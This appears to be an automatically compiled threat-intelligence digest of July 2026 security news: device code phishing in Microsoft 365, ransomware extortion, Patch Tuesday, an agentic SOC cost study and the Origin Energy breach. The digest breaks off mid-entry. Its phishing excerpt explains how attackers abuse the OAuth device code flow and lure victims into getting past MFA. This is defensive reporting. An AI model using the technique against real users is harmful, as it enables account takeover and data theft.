Blog The New Hotness in Phishing: Device Code Attacks in M365 July 21, 2026 The New Hotness in Phishing: Device Code Attacks in M365 Written by Lumi Taiwo and Danny Dubree Threat Hunting Incident Response Social Engineering Table of contents 1. The Attack, Step by Step 2. What the Tokens Unlock 3. What It Looks Like in Your Logs 4. Stopping It: Prevention and Containment 5. The Bottom Line Device code phishing has a quality that makes it unusually effective: it does not follow the pattern of traditional phishing attacks. The victim ends up granting access to the attacker by completing a genuine sign-in on a Microsoft URL, Microsoft[.]com/devicelogin . The MFA prompts the user approves are legitimate. This method also frequently bypasses Conditional Access policies, because as far as the sign-in pipeline is concerned, the authentication originates from a legitimate Microsoft endpoint. From the user’s perspective, nothing is wrong. From the responder’s perspective, the only artifact left behind is an OAuth token issued to a session the attacker controls. Across the business email compromise (BEC) and Microsoft 365 (M365) incident response engagements TrustedSec responds to, device code flow abuse continues to surface as an initial access technique that sidesteps both user suspicion and several of the Conditional Access patterns organizations rely on. This post unpacks how the attack works, what it looks like in the logs, and what actually stops it. How the Device Code Flow is Supposed to Work Modern authentication is designed around the assumption that the device you are logging in to is also the device you are logging in from. You open a browser, navigate to a login page, enter your credentials, complete your MFA prompt, and access is granted. Simple. However, what happens when the device you are trying to authenticate to does not have a browser? The OAuth 2.0 device authorization grant, defined in RFC 8628 and commonly known as the device code flow, exists for this reason. Some devices cannot reasonably host a browser-based login. Examples of such devices include smart TVs, command-line tools, IoT hardware, and printers that all need a way to authenticate a user without a keyboard or full web view. Microsoft implements the grant in Entra ID for exactly these scenarios, and it is used by tooling such as the Azure CLI, the kubectl Entra plugin, and various device enrollment flows. The flow runs in six (6) steps: The client (the “device”) asks Entra ID for a device code, naming the resource and scopes it wants. Entra returns a device_code , a short human-readable user_code , a verification URL ( Microsoft[.]com/devicelogin ), and a time-to-live of approximately 15 minutes. The client displays the user_code and the URL to the user. The user opens the URL on a second device, enters the code, signs in, and consents. The client polls the token endpoint, presenting the device_code . Once the user finishes, Entra returns an access_token and a refresh_token to the polling client. The flow assumes that whoever displays the code and whoever enters it are the same person, but nothing in the protocol binds the two together. If an attacker initiates the flow and persuades a victim to enter the attacker’s code on the real Microsoft page, Entra issues tokens to the attacker’s polling client. The victim signs in legitimately and sees nothing out of place. 1. The Attack, Step by Step The walkthrough below was reproduced in a lab tenant. All identifiers, tokens, and the lure are synthetic and redacted, and nothing here is drawn from a specific engagement. The point is to show the mechanism, not to provide a campaign kit. 1.1 The Lure This is the social-engineering layer, and it is what makes the technique resilient. The threat actor builds a convincing website to mimic a legitimate login request. Then, they craft an email requesting the user to enter a code using another website link. The critical detail is that the link points to the real micros
```

#### Corroborating sources (1)

- **TrustedSec** (detection_response_operations)
  - Title: The New Hotness in Phishing: Device Code Attacks in M365
  - Published: 2026-07-21T04:00:00+00:00
  - Link: https://trustedsec.com/blog/the-new-hotness-in-phishing-device-code-attacks-in-m365
  - Summary: <p>Device code phishing is quietly becoming one of the more effective techniques targeting M365 environments. In this blog, we detail how it works and the Conditional Access controls that shut it down.</p>

### Cluster 65bbcc1b2d — score 8

- Title: US and allies say Russian hackers stole emails without social engineering
- Source: Proofpoint Threat Insight (detection_response_operations)
- Published: 2026-07-23T16:09:25+00:00
- Link: https://www.proofpoint.com/us/newsroom/news/us-and-allies-say-russian-hackers-stole-emails-without-social-engineering
- Fetch status: fetch_failed:HTTPError
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: phishing_social_eng
- content_type: news_report
- confidence_tier: tier_2_operator

#### Primary article taxonomy
- threat_categories: phishing_social_eng
- content_type: news_report
- confidence_tier: tier_2_operator

#### Corroborating sources (1)

- **Proofpoint Threat Insight** (detection_response_operations)
  - Title: US and allies say Russian hackers stole emails without social engineering
  - Published: 2026-07-23T16:09:25+00:00
  - Link: https://www.proofpoint.com/us/newsroom/news/us-and-allies-say-russian-hackers-stole-emails-without-social-engineering

### Cluster cfba3767d7 — score 8

- Title: If you pay a hacker’s ransom, chances are that they’ll come back for more
- Source: Proofpoint Threat Insight (detection_response_operations)
- Published: 2026-07-22T16:14:27+00:00
- Link: https://www.proofpoint.com/us/newsroom/news/if-you-pay-hackers-ransom-chances-are-theyll-come-back-more
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: ransomware_extortion
- actor_attribution: LockBit
- affected_industries: government, healthcare
- content_type: news_report
- confidence_tier: tier_2_operator

#### Primary article taxonomy
- threat_categories: ransomware_extortion
- actor_attribution: LockBit
- affected_industries: healthcare, government
- content_type: news_report
- confidence_tier: tier_2_operator

#### Full body

```
Governments have long warned not to pay a hacker’s ransom demands, arguing that doing so only lets criminals profit from their cyberattacks and funds the next one. There’s also another reason: The hackers are unlikely to leave you alone if you pay up once, and many will come back demanding more. In a report published Wednesday, cybersecurity giant Proofpoint said it surveyed 953 companies and found that over one-third of companies that paid a hacker’s ransom were hit with a second extortion demand. The findings underscore the long-held understanding among security researchers and network defenders that it’s impossible to negotiate in good faith with an extortion racket because there’s no incentive for the other side to actually walk away. Proofpoint’s data shows that ransomware attacks and extortion attacks have evolved from a single transaction where hackers would get paid once and move on, into an effort using multiple forms of leverage, such as retaining stolen data under the threat of publicly releasing it. While hackers have claimed in the past that they will delete or destroy the victim’s stolen data, past incidents have shown that not to be the case. Last month, a hack at market research firm Klue exposed data belonging to its customers , including several cybersecurity firms. The company said it struck a deal with the hackers, who claimed to have deleted the data, but the company later conceded that a separate hacking group swiped a sample of the company’s stolen data, leaving its customers exposed to potential future extortion demands . A similar situation befell Change Healthcare in 2024, after a Russian-speaking ransomware gang stole the health and medical data of the majority of people in America, some 192 million people. Amid a dispute between the hackers and their affiliates (criminal groups often subcontract out attacks), Change Healthcare paid separate ransoms to both groups of criminals to keep the sensitive medical data off of the internet. Security researchers have long suspected that ransomware gangs and extortion rackets will keep hold of the victim’s stolen data, even after a payment is made. U.K. law enforcement confirmed this during their takedown efforts targeting the prolific LockBit ransomware gang in 2024 . Police said that they found victims’ stolen data stored on LockBit’s servers long after they had paid the ransom. Topics cyberattack , ransomware , Security When you purchase through links in our articles, we may earn a small commission . This doesn’t affect our editorial independence. Zack Whittaker Security Editor Zack Whittaker is the security editor at TechCrunch. He also authors the weekly cybersecurity newsletter, this week in security . He can be reached via encrypted message at zackwhittaker.1337 on Signal. You can also contact him by email, or to verify outreach, at zack.whittaker@techcrunch.com . View Bio October 13 – 15 San Francisco Scale faster. Grow your portfolio. Gain practical expertise. No matter your goal, Disrupt can empower you. Save up to $330 toda y! REGISTER NOW Most Popular US accuses American of allegedly wiping his phone using a ‘duress’ password during border search Zack Whittaker Anduril reportedly in talks to raise funding at $100B valuation, more than 3x last year’s mark Ram Iyer Tesla’s robotaxis are moving in reverse Sean O'Kane Jack Dorsey is taking on Slack with Buzz, a group chat platform for teams and their AI agents Amanda Silberling Light made a flip phone — it’s colorful and it’s cheap Amanda Silberling AI music generator Suno breach affects 55M users, per Have I Been Pwned Zack Whittaker Judge pauses $110B Paramount-Warner Bros. merger Aisha Malik
```

#### Corroborating sources (1)

- **Proofpoint Threat Insight** (detection_response_operations)
  - Title: If you pay a hacker’s ransom, chances are that they’ll come back for more
  - Published: 2026-07-22T16:14:27+00:00
  - Link: https://www.proofpoint.com/us/newsroom/news/if-you-pay-hackers-ransom-chances-are-theyll-come-back-more

### Cluster 906833de1b — score 8

- Title: Proofpoint Research Finds 65% of Organizations Affected by Ransomware Say AI Made Attacks More Effective
- Source: Proofpoint Threat Insight (detection_response_operations)
- Published: 2026-07-22T06:06:41+00:00
- Link: https://www.proofpoint.com/us/newsroom/press-releases/proofpoint-research-finds-65-organizations-affected-ransomware-say-ai-made
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: credential_theft, phishing_social_eng, ransomware_extortion
- content_type: news_report
- confidence_tier: tier_2_operator

#### Primary article taxonomy
- threat_categories: ransomware_extortion, phishing_social_eng, credential_theft
- content_type: news_report
- confidence_tier: tier_2_operator

#### Full body

```
News Center Proofpoint Research Finds 65% of Organizations Affected by Ransomware Say AI Made Attacks More Effective Proofpoint Research Finds 65% of Organizations Affected by Ransomware Say AI Made Attacks More Effective July 22, 2026 Global study reveals that AI is amplifying phishing, impersonation and credential theft, transforming ransomware into a human-centric extortion problem 40% of organizations said employees trusted AI-powered attacks, while 38% interacted with malicious content. More than one-third (34%) of attacks began with phishing emails or other email-based social engineering. More than two-thirds of victims had data stolen, and 37% of those who paid faced additional ransom demands. SUNNYVALE, Calif., July 22, 2026 – Proofpoint, Inc. , a global leader in human- and agent-centric security, today released its 2026 AI-Era Ransomware Report , revealing that artificial intelligence is making ransomware significantly more successful by helping attackers create more convincing phishing, impersonation and credential theft campaigns. The global study found that nearly two-thirds (65%) of global organizations affected by ransomware said AI increased the effectiveness of the attack, reinforcing a broader shift in which ransomware increasingly succeeds by exploiting people, identities and trusted communications. Based on a survey of 953 cybersecurity professionals across 12 countries, the research shows that modern ransomware has evolved beyond an encryption event into a sustained extortion campaign. Attackers are increasingly stealing credentials and sensitive data before deploying ransomware, using trusted communications to gain initial access and applying continued pressure through repeated extortion demands. "AI hasn't fundamentally changed ransomware, but it has materially improved the attacks that lead to ransomware," said Ryan Kalember, Chief Strategy Officer at Proofpoint. "Today's attackers are using AI to create highly convincing phishing emails, malware components like scripts, and credential theft campaigns that exploit human trust at scale. Organizations that continue treating ransomware and data extortion as endpoint or recovery problems are missing what these attacks most frequently begin with: people, identities and trusted communications." Key global findings from Proofpoint’s 2026 AI-Era Ransomware Report include: People are the primary ransomware attack surface, and AI is making it worse. With AI, attackers can create more convincing phishing lures, write more targeted impersonation messages, and do faster reconnaissance of organizational structures and message patterns. Among the global organizations that experienced a ransomware attack, 28% said that AI significantly increased the attack’s effectiveness. Another 37% said that it somewhat increased effectiveness. Combined, 65% said AI made the attack more effective. Only 9% reported no evidence of AI use at all. The leading entry methods are all human-dependent. When organizations identified the primary point of entry for their ransomware incident, the results pointed overwhelmingly to human interaction. Phishing emails and other email-based social engineering attacks were the initial entry vector in 34% of incidents. Malicious links (47%) were identified as the most common initial threat, followed by malicious attachments (46%), credential harvesting (36%), and Business Email Compromise (35%). This demonstrates that today's most successful ransomware campaigns continue to rely on trusted communications and user interaction throughout the attack lifecycle. Payment leads to escalation, not resolution. Despite years of guidance from law enforcement and security agencies advising against payment, more than half (54%) of affected organizations paid a ransom. Yet, more than one-third (37%) of those that paid faced a second extortion demand, highlighting ransomware's evolution from a single payment event into an ongoing negotiation in which attackers hold m
```

#### Corroborating sources (1)

- **Proofpoint Threat Insight** (detection_response_operations)
  - Title: Proofpoint Research Finds 65% of Organizations Affected by Ransomware Say AI Made Attacks More Effective
  - Published: 2026-07-22T06:06:41+00:00
  - Link: https://www.proofpoint.com/us/newsroom/press-releases/proofpoint-research-finds-65-organizations-affected-ransomware-say-ai-made

### Cluster 6c33b3b5cf — score 8

- Title: July Patch Tuesday only feels endless
- Source: Sophos X-Ops (detection_response_operations)
- Published: 2026-07-21T00:00:00+00:00
- Link: https://www.sophos.com/en-us/blog/july-patch-tuesday-only-feels-endless
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: active_exploitation, ddos
- cve_ids: CVE-2026-40400, CVE-2026-56155, CVE-2026-56164
- urgency_signals: actively_exploited
- content_type: news_report
- confidence_tier: tier_2_operator

#### Primary article taxonomy
- threat_categories: ddos, active_exploitation
- cve_ids: CVE-2026-56155, CVE-2026-56164, CVE-2026-40400
- urgency_signals: actively_exploited
- content_type: news_report
- confidence_tier: tier_2_operator

#### Summary

```
<p>AI deluge brings 575 CVEs, 479 advisories, reset to blog-post format</p> Categories: Threat Research Tags: x-ops, Patch Tuesday, MICROSOFT PATCH TUESDAY
```

#### Full body

```
July Patch Tuesday only feels endless AI deluge brings 575 CVEs, 479 advisories, reset to blog-post format Written by Angela Gunn Threat Research x-ops Patch Tuesday MICROSOFT PATCH TUESDAY Share This Link Copied Microsoft on Tuesday released 575 patches affecting 29 product families. Sixty-three of the addressed issues are considered by Microsoft to be of Critical severity; 44 CVEs are expected to be exploited within the next 30 days. (Two already are, though neither CVE-2026-56155 nor CVE-2026-56164 is considered to be of Critical severity.) One hundred and three have a CVSS Base score of 8.0 or higher. Just one was publicly disclosed as of release day and two are acknowledged to be under active exploit in the wild. The advisory tally this month is likewise elevated. In addition to the usual Servicing Stack update, there are 479 advisories, all touching Edge. Virtually all of these were patched in advance of Patch Tuesday, but as ever we encourage readers to be sure that they’ve applied all available browser patches when those are made available. There were no Adobe-related patches made available by Microsoft this month, and aside from the 435 Chromium-issued Edge advisory items, all CVEs (and the Servicing Stack) originated with Microsoft. Various of this month’s issues are amenable to direct detection by Sophos protections, and we include information on those in the usual table below. Stepping back from this July’s output, we’re more or less four months into the AI-finder era of bug hunting, and patterns are starting to emerge from the noise. First, either finders are suddenly building coalitions that would shame NATO or simultaneous discovery is rampant. In years past it was unusual to see a single bug credited to more than half a dozen finders; this month alone saw at least four CVEs with ten or more credits listed. One, an otherwise remarkable PowerShell RCE bug labeled CVE-2026-40400, has fifteen. In a related vein, bug totals for certain finders (whether individuals or committees) are astonishing. Having a dozen or more CVEs credited to the same entity in the same month is now entirely normal; this month’s top CVE submitter, 0ccbbf129444eb66344ccafb92b00df4, has 47 July credits (44 in Office, over half the month’s Office total) to their handle. Second, though the volume is overwhelming, so far these bugs are turning up in the lab, not the wild. (No complaints.) None of 0ccbbf129444eb66344ccafb92b00df4’s bugs have been seen yet in the wild, and only seven of them are Critical-severity. The heat map in Figure 1 shows that in fact, the percentage of bugs that have either been publicly disclosed or found in the wild has dropped in recent months. Even the percentage of CVEs Microsoft deems more likely to be exploited within the next 30 days is relatively low. Figure 1: A heat map analyzing Patch Tuesday numbers over the past year indicates that though the overall CVE counts are high, the bugs that are coming to light in recent months are most likely not immediately threatening the health of the internet. Does this add credence to the idea that AI bug hunting represents a grand code cleanup that one day will subside, having eliminated all bugs worth finding? We won’t speculate, but it will be interesting to see what happens next. Finally, the sheer volume of CVEs each month means that many security folk are adapting their Patch Tuesday routines. This blog is no exception. For those readers accustomed to using our appendices for guidance each month, we’re switching to a new system that should appeal greatly to those who love data but prefer it in spreadsheet form. Read on. By the numbers Total CVEs: 575 Publicly disclosed: 1 Exploit detected: 2 Severity Critical: 63 Important: 510 Moderate: 2 Impact: Denial of Service: 35 Elevation of Privilege: 254 Information Disclosure: 102 Remote Code Execution: 143 Spoofing: 16 Security Feature Bypass: 17 Tampering: 8 CVSS base score 9.0 or greater: 21 CVSS base score 8.0 or greater: 10
```

#### Corroborating sources (1)

- **Sophos X-Ops** (detection_response_operations)
  - Title: July Patch Tuesday only feels endless
  - Published: 2026-07-21T00:00:00+00:00
  - Link: https://www.sophos.com/en-us/blog/july-patch-tuesday-only-feels-endless
  - Summary: <p>AI deluge brings 575 CVEs, 479 advisories, reset to blog-post format</p> Categories: Threat Research Tags: x-ops, Patch Tuesday, MICROSOFT PATCH TUESDAY

### Cluster 1c5982430a — score 8

- Title: Inside Elastic InfoSec's agentic SOC: When to inline your agent's skills for a 5× cost reduction
- Source: Elastic Security Labs (detection_response_operations)
- Published: 2026-07-24T00:00:00+00:00
- Link: https://www.elastic.co/security-labs/agentic-soc-token-budget-architecture
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- affected_products: Apple iOS/macOS, Okta
- content_type: news_report
- confidence_tier: tier_2_operator

#### Primary article taxonomy
- affected_products: Okta, Apple iOS/macOS
- content_type: news_report
- confidence_tier: tier_2_operator

#### Summary

```
We tested two agentic SOC architectures in parallel across 36,822 real Agent Builder conversations. One won by 5.7x: a specialized workflow triaging alerts for $0.69 each, against $3.42 for a single agent juggling 14 Skills. The data and the decision framework are both below.
```

#### Full body

```
24 July 2026 • Aaron Jewitt Inside Elastic InfoSec's agentic SOC: When to inline your agent's skills for a 5× cost reduction We tested two agentic SOC architectures in parallel across 36,822 real Agent Builder conversations. One won by 5.7x: a specialized workflow triaging alerts for $0.69 each, against $3.42 for a single agent juggling 14 Skills. The data and the decision framework are both below. 10 min read Generative AI , Detection Engineering This is Part 2 of the Inside Elastic InfoSec's Agentic SOC series. Part 1: How we triage every alert before an analyst opens it Investigating a Windows endpoint alert in Elastic InfoSec's production agentic security operations center (SOC) costs $0.69. That's what we pay running an orchestration workflow of specialized Elastic AI agents on the Elastic Inference Service (EIS). Route the same alert to a single agent working through 14 skills , and the bill jumps to $3.42, 5.7x more. At 100 investigations a day, that's an $8,000 monthly gap, and we didn't get it from a lab. It came out of 36,822 real Elastic Agent Builder conversations running in our own production environment. The gap comes down to how you build the SOC in the first place. Give one broad agent a library of skills, and it loads whatever it needs on the fly. Build a fleet of specialized agents instead, and each one runs a fixed methodology through an orchestration layer. Agent Builder handles either setup fine. At our volume, though, running the unoptimized configuration for batch triage is exactly what turns into that $8,000 a month. We'll walk through why the gap opens up, when each architecture earns its keep, and how you can run this same comparison on your own alerts. Multiple specialized agents versus a single agent with skills The single agent with skills is one broad agent paired with a library of Agent Builder skills . The agent has a thin system prompt that describes its general purpose and lists 14 skills it can invoke: macOS forensics, Windows forensics, AWS CloudTrail, Okta investigation, and others. When a new alert or analyst question arrives, the agent decides which skills are relevant, loads them on demand, and reasons over the result. No routing layer, no separate agents. One agent, one context window, one conversation. The single-agent approach is also significantly simpler to build. For teams that aren’t yet ready to invest in a full multi-agent workflow, it’s a practical starting point: Deploy a single agent with skills, scope it to critical severity alerts only, and get agentic investigation coverage running quickly. As your team builds familiarity with Agent Builder and capacity to maintain specialized agents, you can graduate your highest-volume investigation types into the specialized workflow, while the skills agent remains the front door for everything else. Skills aren’t inefficient. They’re loaded on demand, which is exactly what you want when a human analyst is exploring an alert and may need to pivot in unexpected directions. An analyst who starts with macOS forensics, discovers a lateral movement indicator, and needs to pull in the Okta investigation skill next benefits from that on-demand loading. It’s the right behavior for a conversation-driven workflow. The specialized agent workflow is built around a deterministic orchestration layer and a fleet of specialized agents. An Elastic workflow fires when an alert is generated. It enriches the alert with data from 15 or more sources using Elasticsearch Query Language (ES|QL) queries, runs infrastructure checks that close low-risk alerts with no AI cost, and routes the surviving alert to an initial triage agent that makes a first-pass verdict. If the initial triage agent is uncertain, the workflow opens a Kibana case and dispatches a set of specialized agents, each scoped to one domain. The macOS forensics agent knows exactly which tools to use, in what order, with what stop criteria. That methodology is written directly into its system promp
```

#### Corroborating sources (1)

- **Elastic Security Labs** (detection_response_operations)
  - Title: Inside Elastic InfoSec's agentic SOC: When to inline your agent's skills for a 5× cost reduction
  - Published: 2026-07-24T00:00:00+00:00
  - Link: https://www.elastic.co/security-labs/agentic-soc-token-budget-architecture
  - Summary: We tested two agentic SOC architectures in parallel across 36,822 real Agent Builder conversations. One won by 5.7x: a specialized workflow triaging alerts for $0.69 each, against $3.42 for a single agent juggling 14 Skills. The data and the decision framework are both below.

### Cluster 38eb29d9d7 — score 8

- Title: Major Australian energy supplier confirms customer data compromised
- Source: The Record (cyber_news_breach_reporting)
- Published: 2026-07-23T13:20:00+00:00
- Link: https://therecord.media/australia-origin-energy-data-breach
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: data_breach
- affected_industries: critical_infrastructure, financial_services, government, healthcare
- content_type: incident_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: data_breach
- affected_industries: healthcare, financial_services, government, critical_infrastructure
- content_type: incident_report
- confidence_tier: tier_4_news

#### Summary

```
Origin Energy said it was working to figure out how many Australians were affected by a recent data breach.
```

#### Full body

```
A bird on barbed wire near electricity infrastructure in Adelaide, Australia. Image: Cameron Raynes via Unsplash Major Australian energy supplier confirms customer data compromised An Australian energy company serving nearly 5 million customers announced Thursday that it suffered a data breach and that it is working with federal agencies to investigate. On Wednesday, Sydney-based Origin Energy had said in a brief announcement that it was “investigating a potential security incident” after the news outlet The Australian reported that a purported hacker had sent what they claimed to be a sample of stolen records from the company. In a second update , Origin confirmed that customer data had been compromised and that it is “working to understand the total number of impacted customers.” The data may include account information, the last four digits of credit card numbers and last three digits of bank account numbers, as well as names, addresses and dates of birth. Origin CEO Frank Calabria apologized to customers. “One of our key priorities is taking action to secure our systems and ensure no further unauthorised access,” he said. “We are working with independent cyber experts to support Origin, and that work is continuing alongside the work of authorities.” The breach of Australia’s largest electricity and gas retailer follows the recent compromise of sensitive medical data belonging to a major Australian network of healthcare clinics. Partnered Health confirmed that patients who visited at least 21 clinics may have had medical records stolen in a cyberattack. News Briefs News Cybercrime Industry Get more insights with the Recorded Future Intelligence Cloud. Learn more. No previous article No new articles James Reddick has worked as a journalist around the world, including in Lebanon and in Cambodia, where he was Deputy Managing Editor of The Phnom Penh Post. He is also a radio and podcast producer for outlets like Snap Judgment.
```

#### Corroborating sources (1)

- **The Record** (cyber_news_breach_reporting)
  - Title: Major Australian energy supplier confirms customer data compromised
  - Published: 2026-07-23T13:20:00+00:00
  - Link: https://therecord.media/australia-origin-energy-data-breach
  - Summary: Origin Energy said it was working to figure out how many Australians were affected by a recent data breach.

### Cluster c68e26f04e — score 8

- Title: Australian energy provider Origin says data breach exposes client data
- Source: BleepingComputer (cyber_news_breach_reporting)
- Published: 2026-07-23T20:14:35+00:00
- Link: https://www.bleepingcomputer.com/news/security/australian-energy-provider-origin-says-data-breach-exposes-client-data/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: data_breach
- actor_attribution: ShinyHunters
- affected_industries: critical_infrastructure, financial_services, government, telecommunications
- content_type: incident_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: data_breach
- actor_attribution: ShinyHunters
- affected_industries: financial_services, government, critical_infrastructure, telecommunications
- content_type: incident_report
- confidence_tier: tier_4_news

#### Summary

```
Origin Energy has confirmed that an unauthorized party accessed and subsequently leaked customer data online, exposing sensitive personally identifiable information (PII), among others. [...]
```

#### Full body

```
Australian energy provider Origin says data breach exposes client data By Bill Toulas July 23, 2026 04:14 PM 0 Australian energy provider Origin Energy has confirmed a data breach by an unknown threat actor that exposed customers' personally identifiable information (PII). The company has 4.8 million customers and is currently investigating how many of them have been impacted to inform them of the risk via individual notifications. Origin Energy is Australia’s largest energy retailer, providing electricity, natural gas, and broadband internet services to millions of clients across the country. The company is listed on the ASX, has annual revenue of $8.5 billion, and holds a 20% ownership stake in the UK’s renewable energy retailer Octopus. Yesterday, Origin announced that it had launched an investigation into “a potential security incident that may involve unauthorized access to some customers’ data.” An update published today confirms a data breach , listing the following data types as potentially exposed: Full name Physical address Date of birth Phone number Account information Last four digits of credit card Last three digits of bank account The company noted that the exposed financial details are “incomplete” and cannot be used to hijack accounts or make unauthorized charges to clients’ bank accounts. Origin CEO, Frank Calabria, apologized to customers for the sensitive data being exposed, and assured them that the company is taking steps to block further unauthorized access. Also, confirmed impacted clients are being contacted directly and offered support via a dedicated portal and related resources. Origin has informed the Australian Federal Police (AFP), the Australian Cyber Security Centre, and the Office of the Australian Information Commissioner about the incident, and continues to engage with the agencies as needed. Hackers claim large-scale data theft Local media outlet 7news reported that before Origin Energy released its second statement, a threat actor identifying as “John Doe” contacted them to claim the breach. The threat actor alleged to be holding the data types for 2 million Origin customers. Threat actor's message to Origin Source: 7news The hacker claimed that they contacted security teams, customer support, and even board executives, without receiving a response. The hacker has set up a site where he threatens to leak the stolen data in two weeks unless Origin contacts them via Signal to negotiate a solution. Test every layer before attackers do Security teams log 54% of successful attacks and alert on just 14%. The rest move through your environment unseen. The Picus whitepaper shows how breach and attack simulation tests your SIEM and EDR rules so threats stop slipping by detection. Get the whitepaper Related Articles: Mount Royal University confirms breach as hackers claim attack NAIC says public data stolen in ShinyHunters' PeopleSoft breach 7-Eleven confirms data breach claimed by the ShinyHunters gang Upbound says hack caused $13 million in fraudulent Acima leases Swiss rail giant Stadler rejects $12.3M ransom demand after cyberattack
```

#### Corroborating sources (1)

- **BleepingComputer** (cyber_news_breach_reporting)
  - Title: Australian energy provider Origin says data breach exposes client data
  - Published: 2026-07-23T20:14:35+00:00
  - Link: https://www.bleepingcomputer.com/news/security/australian-energy-provider-origin-says-data-breach-exposes-client-data/
  - Summary: Origin Energy has confirmed that an unauthorized party accessed and subsequently leaked customer data online, exposing sensitive personally identifiable information (PII), among others. [...]

### Cluster cef5a868eb — score 8

- Title: Data Breach Confirmed After Australian Energy Giant Origin Is Hacked
- Source: SecurityWeek (cyber_news_breach_reporting)
- Published: 2026-07-24T05:52:31+00:00
- Link: https://www.securityweek.com/data-breach-confirmed-after-australian-energy-giant-origin-is-hacked/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: active_exploitation, credential_theft, data_breach, zero_day
- affected_industries: critical_infrastructure, financial_services, manufacturing_industrial
- affected_products: Microsoft SharePoint, OpenAI/ChatGPT
- tools_used: Linux kernel
- urgency_signals: actively_exploited, zero_day
- content_type: incident_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: credential_theft, zero_day, data_breach, active_exploitation
- affected_industries: financial_services, critical_infrastructure, manufacturing_industrial
- affected_products: Microsoft SharePoint, OpenAI/ChatGPT
- tools_used: Linux kernel
- urgency_signals: actively_exploited, zero_day
- content_type: incident_report
- confidence_tier: tier_4_news

#### Summary

```
A hacker claims to have stolen the information of 2 million Origin Energy customers and is threatening to leak it. The post Data Breach Confirmed After Australian Energy Giant Origin Is Hacked appeared first on SecurityWeek .
```

#### Full body

```
Australia’s Origin Energy Limited has confirmed suffering a data breach, and a hacker claims to have accessed the records of millions of customers. Headquartered in Sydney, Origin Energy is one of Australia’s largest electricity and gas retailers while also engaging in power generation, natural gas exploration and production, and renewable energy initiatives. On July 22, the company said it had launched an investigation into a potential cybersecurity incident involving access to customer information. In an update shared on July 23, the company confirmed that there had been unauthorized access to “some customers’ data”, but it had still been working on determining how many individuals are affected. Origin said the attacker may have obtained names, addresses, dates of birth, phone numbers, account information, and partial payment card or bank account numbers. Impacted customers are being contacted. Origin has engaged external cybersecurity experts to assist with the investigation and has notified Australian law enforcement, cybersecurity, and privacy agencies. Advertisement. Scroll to continue reading. The energy giant has not mentioned anything about the incident impacting production and critical operations. Australia’s 7News has been contacted by an individual claiming to be behind the attack. The alleged hacker said the information of 2 million individuals was stolen and suggested that it would all be leaked unless Origin pays a ransom. Origin Energy has roughly 4.8 million customers. Contacted by SecurityWeek , an Origin spokesperson said, “Origin notes there is considerable media speculation in relation to the data security incident we are actively managing,” adding, “Our investigation is ongoing, and we currently have no further updates.” *updated with statement from Origin Related : Chick-fil-A Accounts Get Fried in Credential Stuffing Attack Related : Upbound Group Says Data Breach Led to $13 Million in Fraudulent Contract Losses Related : Suno, Paidwork Data Breaches Affect Tens of Millions of Accounts Written By Eduard Kovacs Eduard Kovacs (@EduardKovacs) is senior managing editor at SecurityWeek. He worked as a high school IT teacher before starting a career in journalism in 2011. Eduard holds a bachelor’s degree in industrial informatics and a master’s degree in computer techniques applied in electrical engineering. Daily Briefing Newsletter Subscribe to the SecurityWeek Email Briefing for the latest cybersecurity threats, trends, and expert insights. More from Eduard Kovacs Nuclear-Sabotage Malware Benchmark Trips Up Most Frontier AI Models Upbound Group Says Data Breach Led to $13 Million in Fraudulent Contract Losses New Check Point Zero-Day Vulnerability Exploited in the Wild US Warns of Iranian Hackers Targeting Siemens, Schneider, and Rockwell ICS Devices Suno, Paidwork Data Breaches Affect Tens of Millions of Accounts Flaw in Adobe Extension With 300M Installs Enabled WhatsApp Data Theft Fourth SharePoint Vulnerability Exploited in Past Month’s Wave of Attacks Oracle Patches Over 1,400 Vulnerabilities With Quarterly Security Updates Latest News Rockwell Patches Code Execution Flaws in Arena Simulation Software In Other News: Dolphin X AI-Powered Malware, Car Anti-Theft Device Hack, 400 Linux Kernel Flaws AegisAI Raises $36 Million for AI-Powered Email Security Industry Reactions to OpenAI Models Hacking Hugging Face: Feedback Friday OpenAI Fixes ChatGPT Agent Flaw That Could Let Attackers Forge an AI Insider Is Patching Dead? Vulnerability Management in the Post-Mythos Era Chick-fil-A Accounts Get Fried in Credential Stuffing Attack Abstract Raises $25 Million to Expand Composable Security Operations Platform Trending Daily Briefing Newsletter Subscribe to the SecurityWeek Email Briefing to stay informed on the latest threats, trends, and technology, along with insightful columns from industry experts. Webinar: Closing the Exploitation Gap July 22, 2026 Join this live webinar as we explore why exploitation is
```

#### Corroborating sources (1)

- **SecurityWeek** (cyber_news_breach_reporting)
  - Title: Data Breach Confirmed After Australian Energy Giant Origin Is Hacked
  - Published: 2026-07-24T05:52:31+00:00
  - Link: https://www.securityweek.com/data-breach-confirmed-after-australian-energy-giant-origin-is-hacked/
  - Summary: A hacker claims to have stolen the information of 2 million Origin Energy customers and is threatening to leak it. The post Data Breach Confirmed After Australian Energy Giant Origin Is Hacked appeared first on SecurityWeek .

### Cluster c577dfeff7 — score 8

- Title: Is Patching Dead? Vulnerability Management in the Post-Mythos Era
- Source: SecurityWeek (cyber_news_breach_reporting)
- Published: 2026-07-23T15:00:00+00:00
- Link: https://www.securityweek.com/is-patching-dead-vulnerability-management-in-the-post-mythos-era/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: data_breach
- affected_industries: critical_infrastructure, government
- affected_products: Anthropic/Claude, Linux kernel
- tools_used: Palo Alto Networks
- urgency_signals: poc_available
- content_type: vulnerability_disclosure
